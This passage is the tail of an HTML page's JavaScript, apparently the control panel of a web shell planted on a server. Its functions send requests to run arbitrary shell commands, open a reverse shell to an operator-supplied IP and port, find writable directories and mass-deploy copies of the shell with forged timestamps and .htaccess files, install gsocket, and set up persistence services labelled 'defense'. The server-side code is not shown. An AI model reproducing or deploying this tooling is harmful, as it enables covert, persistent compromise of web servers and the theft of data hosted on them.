                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function extractZip(path) {
            document.getElementById('extract-zip-path').value = path;
            document.getElementById('extract-to-path').value = currentDirectory;
            showModal('extract-zip-modal');
        }
        
        function performExtractZip() {
            const zipPath = document.getElementById('extract-zip-path').value;
            const extractPath = document.getElementById('extract-to-path').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=extract_zip&zip_path=' + encodeURIComponent(zipPath) + '&extract_path=' + encodeURIComponent(extractPath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('extract-zip-modal');
                    showAlert(data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function executeTerminalCommand(background = false) {
            const command = document.getElementById('terminal-command').value;
            if (!command.trim()) return;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=execute_command&command=' + encodeURIComponent(command) + '&background=' + (background ? '1' : '0')
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('terminal-output');
                output.innerHTML += `<br><span style="color:#60a5fa">$ ${command}</span><br>${data.output}`;
                output.scrollTop = output.scrollHeight;
                document.getElementById('terminal-command').value = '';
                
                if (background) {
                    showAlert('Command running in background', 'success');
                }
            });
        }
        
        function startBackconnect() {
            const method = document.getElementById('backconnect-method').value;
            const ip = document.getElementById('backconnect-ip').value;
            const port = document.getElementById('backconnect-port').value;
            
            if (!ip || !port) {
                showAlert('Please enter IP and port', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=backconnect&method=' + encodeURIComponent(method) + '&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('Reverse shell initiated. Check your listener!', 'success');
                } else {
                    showAlert('Backconnect failed: ' + data.message, 'error');
                }
            });
        }
        
        function findWritablePaths() {
            const basePath = document.getElementById('base-path').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=deploy&base_path=' + encodeURIComponent(basePath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.paths && data.paths.length > 0) {
                    selectedPaths = data.paths;
                    
                    let html = '';
                    data.paths.forEach(path => {
                        html += `<div style="margin-bottom: 10px; padding: 10px; background: var(--bg-secondary); border-radius: 6px;">
                            <label style="display: flex; align-items: center; gap: 10px;">
                                <input type="checkbox" class="path-checkbox" value="${path}" checked>
                                <span>${path}</span>
                            </label>
                        </div>`;
                    });
                    
                    document.getElementById('paths-list').innerHTML = html;
                    document.getElementById('deploy-results').style.display = 'block';
                    document.getElementById('deploy-btn').style.display = 'inline-block';
                    showAlert('Found ' + data.paths.length + ' writable paths', 'success');
                } else {
                    showAlert('No writable paths found', 'error');
                }
            });
        }
        
        function deployShell() {
            const checkboxes = document.querySelectorAll('.path-checkbox:checked');
            if (checkboxes.length === 0) {
                showAlert('Please select at least one path', 'error');
                return;
            }
            
            const filenames = document.getElementById('shell-filenames').value;
            const createHtaccess = document.getElementById('create-htaccess').checked;
            
            const outputDiv = document.getElementById('deploy-output');
            outputDiv.style.display = 'block';
            outputDiv.innerHTML = '<h3>Deployment Results:</h3>';
            
            let totalDeployed = 0;
            let totalFailed = 0;
            
            checkboxes.forEach(checkbox => {
                const path = checkbox.value;
                
                fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'action=deploy_shell&target_path=' + encodeURIComponent(path) + 
                          '&filenames=' + encodeURIComponent(filenames) + 
                          '&create_htaccess=' + (createHtaccess ? '1' : '0')
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.results) {
                        data.results.forEach(result => {
                            const resultDiv = document.createElement('div');
                            resultDiv.className = 'result-item ' + (result.success ? 'result-success' : 'result-error');
                            resultDiv.innerHTML = `
                                <strong>${result.filename}</strong> in ${path}<br>
                                Status: ${result.success ? 'SUCCESS' : 'FAILED'} ${result.error ? '- ' + result.error : ''}<br>
                                ${result.timestamp_matched ? 'Timestamp matched ✓' : ''}
                                ${result.htaccess ? 'HTAccess created ✓' : ''}
                            `;
                            outputDiv.appendChild(resultDiv);
                            
                            if (result.success) {
                                totalDeployed++;
                                checkbox.parentElement.style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
                            } else {
                                totalFailed++;
                                checkbox.parentElement.style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
                            }
                        });
                        
                        if (totalDeployed + totalFailed === checkboxes.length * filenames.split(',').length) {
                            showAlert(`Deployment complete: ${totalDeployed} successful, ${totalFailed} failed`, 
                                     totalFailed === 0 ? 'success' : 'error');
                        }
                    }
                });
            });
        }
        
        function installGsocket() {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=install_gsocket'
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('gsocket-output');
                output.style.display = 'block';
                output.innerHTML = data.output;
                output.scrollTop = output.scrollHeight;
                showAlert('Gsocket installation attempted', 'success');
            });
        }
        
        function installDefense(type) {
            if (!confirm(`Install ${type} defense? This will run in background.`)) return;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=install_defense&defense_type=' + encodeURIComponent(type)
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('defense-output');
                outputDiv.style.display = 'block';
                outputDiv.innerHTML = `
                    <div class="alert ${data.success ? 'alert-success' : 'alert-error'}">
                        ${data.message}<br>
                        ${data.pid ? 'PID: ' + data.pid + '<br>' : ''}
                        ${data.script_path ? 'Script: ' + data.script_path + '<br>' : ''}
                        ${data.location ? 'Location: ' + data.location + '<br>' : ''}
                        ${data.service_file ? 'Service: ' + data.service_file + '<br>' : ''}
                    </div>
                `;
            });
        }
        
        function checkDefense() {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=check_defense'
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('defense-output');
                outputDiv.style.display = 'block';
                
                let html = '<h3>Defense Status:</h3>';
                for (const [type, status] of Object.entries(data.results)) {
                    html += `
                        <div class="result-item ${status ? 'result-success' : 'result-error'}">
                            <strong>${type.toUpperCase()}</strong>: ${status ? 'ACTIVE ✓' : 'INACTIVE ✗'}
                        </div>
                    `;
                }
                outputDiv.innerHTML = html;
            });
        }
        
        function checkPorts() {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=port_check'
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('portcheck-output');
                output.style.display = 'block';
                output.innerHTML = data.output;
                output.scrollTop = output.scrollHeight;
            });
        }
        
        function createNewFile() {
            const filename = document.getElementById('create-filename').value;
            const content = document.getElementById('create-file-content').value;
            
            if (!filename) {
                showAlert('Please enter filename', 'error');
                return;
            }
            
            const path = currentDirectory + '/' + filename;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=create_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (content) {
                        fetch('', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: 'action=write_file&path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
                        })
                        .then(response => response.json())
                        .then(writeData => {
                            if (writeData.success) {
                                showAlert('File created and content written successfully', 'success');
                                editFile(path);
                            } else {
                                showAlert('File created but content not written', 'error');
                            }
                        });
                    } else {
                        showAlert('File created successfully', 'success');
                        editFile(path);
                    }
                } else {
                    showAlert('Cannot create file: ' + data.message, 'error');
                }
            });
        }
        
        function createNewFolder() {
            const foldername = document.getElementById('create-foldername').value;
            
            if (!foldername) {
                showAlert('Please enter folder name', 'error');
                return;
            }
            
            const path = currentDirectory + '/' + foldername;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=create_dir&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('Folder created successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('Cannot create folder: ' + data.message, 'error');
                }
            });
        }
        
        function findBackdoors() {
            const path = document.getElementById('search-path').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=find_backdoors&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('backdoor-output');
                output.style.display = 'block';
                output.innerHTML = data.output || 'No backdoors found';
                output.scrollTop = output.scrollHeight;
            });
        }
        
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
        }
        
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }
        
        function showAlert(message, type) {
            const alert = document.getElementById('global-alert');
            alert.textContent = message;
            alert.className = 'alert alert-' + (type === 'success' ? 'success' : type === 'info' ? 'info' : 'error');
            alert.style.display = 'block';
            
            setTimeout(() => {
                alert.style.display = 'none';
            }, 5000);
        }
        
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter' && document.getElementById('terminal-command') === document.activeElement) {
                executeTerminalCommand();
            }
            
            if (e.key === 'Enter' && document.getElementById('terminal-command') === document.activeElement && !e.ctrlKey) {
                executeTerminalCommand();
            }
            
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(modal => {
                    modal.classList.remove('active');
                });
            }
        });
        
        document.querySelectorAll('.modal input').forEach(input => {
            input.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    const modal = input.closest('.modal');
                    const button = modal.querySelector('.btn-success, .btn-purple');
                    if (button) button.click();
                }
            });
        });
    </script>
</body>
</html>
